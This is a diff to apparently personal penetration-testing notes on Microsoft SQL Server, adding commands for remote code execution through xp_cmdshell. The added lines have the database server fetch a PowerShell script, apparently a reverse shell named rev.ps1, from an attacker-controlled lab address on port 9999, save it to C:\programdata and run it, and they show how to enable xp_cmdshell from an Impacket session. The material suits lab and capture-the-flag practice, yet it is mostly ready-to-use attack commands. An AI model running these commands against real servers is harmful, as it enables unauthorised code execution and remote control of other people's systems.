@@ -58,8 +58,16 @@ sqlcmd -S 10.129.20.13 -U username -P Password123
 - `tempdb` - keeps temporary objects for SQL queries.
 # RCE
 ```
-xp_cmdshell 'whoami'
+xp_cmdshell whoami
+
+xp_cmdshell powershell -c iwr http://10.10.14.155:9999/xxx.ps1 -o C:\programdata\rev.ps1
+xp_cmdshell powershell -c C:\programdata\rev.ps1
 ```
+enable if you logged in with Impacket:
+```
+SQL (sa  dbo@master)> enable_xp_cmdshell
+```
+or
 enable shell if it's disabled and we have rights:
 ```
 EXEC sp_configure 'show advanced options', 1;
